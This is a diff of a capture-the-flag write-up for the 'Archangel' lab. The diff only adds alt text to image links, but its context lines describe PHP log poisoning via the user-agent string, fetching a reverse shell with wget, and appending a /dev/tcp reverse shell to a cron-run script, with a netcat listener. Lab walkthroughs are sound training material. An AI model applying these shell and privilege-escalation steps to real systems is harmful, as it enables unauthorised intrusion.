@@ -38,13 +38,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 **Find a different hostname**
 
-![](/assets/archangel01.png)
+![0xskar](/assets/archangel01.png)
 
 - checking the source code of ``http://10.10.100.253`` we find ``support@mafialive.thm`` we can add this domain to the hosts file  to continue enumeration. After traveling there we find our first flag.
 
 **Find flag 1**
 
-![](/assets/archangel02.png)
+![0xskar](/assets/archangel02.png)
 
 **Look for a page under development**
 
@@ -81,7 +81,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 - start by poising the logfile with the php payload in the user-agent string
 
-![](/assets/archangel03.png)
+![0xskar](/assets/archangel03.png)
 
 - we get ``cmd=id HTTP/1.1" 200 997 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data) " ``
 - now we can wget our reverse shell, then traverse to open up the reverse shell when we have our netcat listener setup.
@@ -90,7 +90,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## What is the user flag?
 
-![](/assets/archangel04.png)
+![0xskar](/assets/archangel04.png)
 
 * * * 
 
@@ -99,7 +99,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 - checking the ``/etc/crontab`` can see that we can move to archangel - ``echo "sh -i >& /dev/tcp/10.2.127.225/6670 0>&1" >> /opt/helloworld.sh``
 - setup listener ``rlwrap nc -lvnp 6670``
 
-![](/assets/archangel05.png)
+![0xskar](/assets/archangel05.png)
 
 - Now that we found user 2 flag we can continue escaliation to root.
 
